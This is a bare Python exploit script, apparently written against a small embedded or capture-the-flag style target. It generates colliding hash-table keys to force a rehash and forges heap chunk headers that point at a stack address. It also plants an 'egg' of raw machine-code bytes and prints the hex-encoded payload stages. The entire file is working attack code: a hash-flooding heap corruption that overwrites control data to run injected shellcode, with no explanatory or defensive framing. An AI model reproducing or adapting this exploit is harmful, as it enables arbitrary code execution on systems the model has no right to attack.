#!/usr/bin/env python

import random
import struct
import binascii

bs = 5
ns = 0x12
str_size = 0x0f
seen = []
used = []


charset = range(ord('a'), ord('z')+1)


def get_header_size(n):
    return 2*(6+2*2**n)


def get_bs():
    return 6+ns*bs


def get_tot(n):
    return get_header_size(n)+(2**n)*get_bs()


def num_rehash(n):
    return (2**n)*bs//4+2-len(seen)


def hash(h, n):
    v = 0
    for c in h:
        v = (v+c)*0x1f
    return v & (2**n-1)


def get_h(val, n, start=b'', end=False, rem=None, hn=None):
    if not hn:
        hn = n

    if rem==None:
        rem = str_size-1-len(start)

    while True:
        tmp = bytes([random.choice(charset) for x in range(rem)])
        if end:
            tmp = tmp+start
        else:
            tmp = start+tmp
        if hash(tmp, hn) == val and tmp not in seen:
            seen.append(tmp)
            used[val & (2**n-1)] += 1
            return tmp


def build_reqs(v):
    buf = b''
    for x in v:
        buf += b'nnn '
        buf += x
        buf += b' 1;'
    return buf


def recompute_used(n):
    global used
    used = [0]*(2**n)
    for x in seen:
        used[hash(x, n)] += 1


def chunk(prev, next, l):
    return struct.pack('<HHH', prev, next, l)


def tsf(x):
    if isinstance(x, str):
        x = x.encode()
    return binascii.hexlify(x).decode()


def f(x):
    print('got ', len(x))
    return tsf(build_reqs(x))


def trigger_rehash(n):
    tb = []
    pos = 0
    while num_rehash(n) > 0:
        if used[pos] < bs:
            tb.append(get_h(pos, n))
        pos += 1

    return tb


def go0():
    n = 3
    en = 2**n
    recompute_used(n)

    stage0 = []
    target = 0
    pos_bs_chunk = 2

    heap_start = 0x5010
    sp_addr = 0x3dce

    stage0.extend([get_h(target, n, hn=n+1) for i in range(bs)])
    stage0.extend([get_h(target+1, n, hn=n+1) for i in range(bs)])

    stage0.extend(trigger_rehash(n))

    print(f(stage0))

    n += 1
    en *= 2
    recompute_used(n)

    stage1 = []

    target_id = en-1

    base_addr = heap_start+get_tot(n-1)+get_header_size(n)
    target_addr = base_addr + get_bs()*target_id+ns*used[target_id]+6
    print('targetting addr >> ', hex(target_addr))

    egg_id = en-2
    rem=2
    egg_addr = base_addr + get_bs()*egg_id+ns*used[egg_id]+6+rem
    egg = struct.pack('<H', egg_addr+2)
    egg += binascii.unhexlify('324001ff1283b01210')
    stage1.append(get_h(egg_id, n, start=egg, end=True, rem=rem))

    target_buf = chunk(0x1010, 0x7070, 0x5050)
    stage1.append(get_h(target_id, n, start=target_buf))

    buf = chunk(0x1010, target_addr,  0x111)
    stage1.append(get_h(target, n, start=buf))

    buf = chunk(sp_addr-2, egg_addr-2, 0x111)
    stage1.append(get_h(target+1, n, start=buf))

    stage1.extend(trigger_rehash(n))
    print(f(stage1))

    print('tot >> ')
    print(f(stage0+stage1))

go0()
